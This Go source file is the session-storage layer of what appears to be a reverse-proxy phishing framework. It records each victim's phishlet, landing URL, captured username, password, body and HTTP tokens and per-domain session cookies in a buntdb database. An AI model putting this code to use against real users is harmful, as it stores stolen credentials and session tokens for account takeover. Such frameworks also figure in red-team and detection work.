package database

import (
	"encoding/json"
	"fmt"
	"sort"
	"time"

	"github.com/tidwall/buntdb"
)

const SessionTable = "sessions"

type Session struct {
	Id           int                                `json:"id"`
	Phishlet     string                             `json:"phishlet"`
	LandingURL   string                             `json:"landing_url"`
	Username     string                             `json:"username"`
	Password     string                             `json:"password"`
	Custom       map[string]string                  `json:"custom"`
	BodyTokens   map[string]string                  `json:"body_tokens"`
	HttpTokens   map[string]string                  `json:"http_tokens"`
	CookieTokens map[string]map[string]*CookieToken `json:"tokens"`
	SessionId    string                             `json:"session_id"`
	UserAgent    string                             `json:"useragent"`
	RemoteAddr   string                             `json:"remote_addr"`
	CreateTime   int64                              `json:"create_time"`
	UpdateTime   int64                              `json:"update_time"`
}

type CookieToken struct {
	Name     string
	Value    string
	Path     string
	HttpOnly bool
}

func (d *Database) sessionsInit() error {
	if err := d.db.CreateIndex("sessions_id", SessionTable+":*", buntdb.IndexJSON("id")); err != nil && err != buntdb.ErrIndexExists {
		return err
	}
	if err := d.db.CreateIndex("sessions_sid", SessionTable+":*", buntdb.IndexJSON("session_id")); err != nil && err != buntdb.ErrIndexExists {
		return err
	}
	return nil
}

func (d *Database) loadSessions() error {
	return d.db.View(func(tx *buntdb.Tx) error {
		return tx.Ascend("sessions_id", func(_, value string) bool {
			s := &Session{}
			if err := json.Unmarshal([]byte(value), s); err != nil {
				d.lastErr = err
				return false
			}
			normalizeSession(s)
			d.sessionsByID[s.Id] = s
			d.sessionsBySID[s.SessionId] = s
			if s.Id >= d.nextSessionID {
				d.nextSessionID = s.Id + 1
			}
			return true
		})
	})
}

func (d *Database) sessionsCreate(sid, phishlet, landingURL, userAgent, remoteAddr string) error {
	d.stateMu.Lock()
	if _, exists := d.sessionsBySID[sid]; exists {
		d.stateMu.Unlock()
		return fmt.Errorf("session already exists: %s", sid)
	}
	now := time.Now().UTC().Unix()
	s := &Session{
		Id:           d.nextSessionID,
		Phishlet:     phishlet,
		LandingURL:   landingURL,
		Custom:       make(map[string]string),
		BodyTokens:   make(map[string]string),
		HttpTokens:   make(map[string]string),
		CookieTokens: make(map[string]map[string]*CookieToken),
		SessionId:    sid,
		UserAgent:    userAgent,
		RemoteAddr:   remoteAddr,
		CreateTime:   now,
		UpdateTime:   now,
	}
	d.nextSessionID++
	d.sessionsByID[s.Id] = s
	d.sessionsBySID[sid] = s
	value, err := marshalSession(s)
	if err != nil {
		d.stateMu.Unlock()
		return err
	}
	key := sessionKey(s.Id)
	err = d.enqueue(func(tx *buntdb.Tx) error {
		_, _, err := tx.Set(key, value, nil)
		return err
	})
	d.stateMu.Unlock()
	return err
}

func (d *Database) sessionsUpdate(sid string, update func(*Session)) error {
	d.stateMu.Lock()
	s, ok := d.sessionsBySID[sid]
	if !ok {
		d.stateMu.Unlock()
		return fmt.Errorf("session not found: %s", sid)
	}
	update(s)
	s.UpdateTime = time.Now().UTC().Unix()
	value, err := marshalSession(s)
	id := s.Id
	if err != nil {
		d.stateMu.Unlock()
		return err
	}
	key := sessionKey(id)
	err = d.enqueue(func(tx *buntdb.Tx) error {
		_, _, err := tx.Set(key, value, nil)
		return err
	})
	d.stateMu.Unlock()
	return err
}

func (d *Database) sessionsList() ([]*Session, error) {
	d.stateMu.RLock()
	sessions := make([]*Session, 0, len(d.sessionsByID))
	for _, session := range d.sessionsByID {
		sessions = append(sessions, cloneSession(session))
	}
	d.stateMu.RUnlock()
	sort.Slice(sessions, func(i, j int) bool { return sessions[i].Id < sessions[j].Id })
	return sessions, nil
}

func normalizeSession(s *Session) {
	if s.Custom == nil {
		s.Custom = make(map[string]string)
	}
	if s.BodyTokens == nil {
		s.BodyTokens = make(map[string]string)
	}
	if s.HttpTokens == nil {
		s.HttpTokens = make(map[string]string)
	}
	if s.CookieTokens == nil {
		s.CookieTokens = make(map[string]map[string]*CookieToken)
	}
}

func cloneSession(s *Session) *Session {
	copySession := *s
	copySession.Custom = cloneStringMap(s.Custom)
	copySession.BodyTokens = cloneStringMap(s.BodyTokens)
	copySession.HttpTokens = cloneStringMap(s.HttpTokens)
	copySession.CookieTokens = cloneCookieTokens(s.CookieTokens)
	return &copySession
}

func cloneStringMap(values map[string]string) map[string]string {
	cloned := make(map[string]string, len(values))
	for key, value := range values {
		cloned[key] = value
	}
	return cloned
}

func cloneCookieTokens(tokens map[string]map[string]*CookieToken) map[string]map[string]*CookieToken {
	cloned := make(map[string]map[string]*CookieToken, len(tokens))
	for domain, values := range tokens {
		domainTokens := make(map[string]*CookieToken, len(values))
		for name, token := range values {
			if token == nil {
				domainTokens[name] = nil
				continue
			}
			copyToken := *token
			domainTokens[name] = &copyToken
		}
		cloned[domain] = domainTokens
	}
	return cloned
}
